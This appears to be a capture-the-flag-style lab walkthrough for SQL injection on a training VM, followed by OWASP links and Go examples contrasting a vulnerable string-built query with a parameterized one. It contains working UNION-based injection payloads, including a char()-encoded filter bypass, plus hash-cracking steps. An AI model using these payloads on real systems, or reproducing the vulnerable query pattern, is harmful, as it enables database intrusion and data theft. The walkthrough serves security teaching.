# SQL injection

### Walkthrough

http://VM_IP/?page=searchimg

1. Get table's names:

    ```sql
    1 union select TABLE_NAME, 2 from information_schema.tables
    ```

2. Get all 'list_images' table column's names:

    ```sql
    -- mariaDB uses magic quotes defence, so we need to use the char rappresentation of 'list_images'
    1 union select column_name, 2 FROM information_schema.columns WHERE table_name = char(108,105,115,116,95,105,109,97,103,101,115)
    ```

3. Identify encrypting algorithm of the 'comment' value: `hashcat --identify`
4. Decrypt 'comment' value: https://md5decrypt.net/en/

---

### Explanation

https://owasp.org/www-community/attacks/SQL_Injection

---

### Prevention

https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

Parameterized queries

To prevent SQL injection never concatenate user input into SQL strings and instead using parameterized queries so the database treats input as data, not code.

```go
// VULNERABLE
name := r.FormValue("name")
query := fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", name)
rows, err := db.Query(query)
```

```go
// SAFE
name := r.FormValue("name")
rows, err := db.Query("SELECT * FROM users WHERE name = $1", name)
```

1. The SQL template is sent to the database first — the database compiles/parses `SELECT * FROM users WHERE name = $1` as pure code, with a placeholder where the value will go.
2. The value is sent separately — user_input is transmitted as data, not as SQL code.
3. The database never interprets the value as SQL — it's treated as a plain string literal, no matter what it contains.
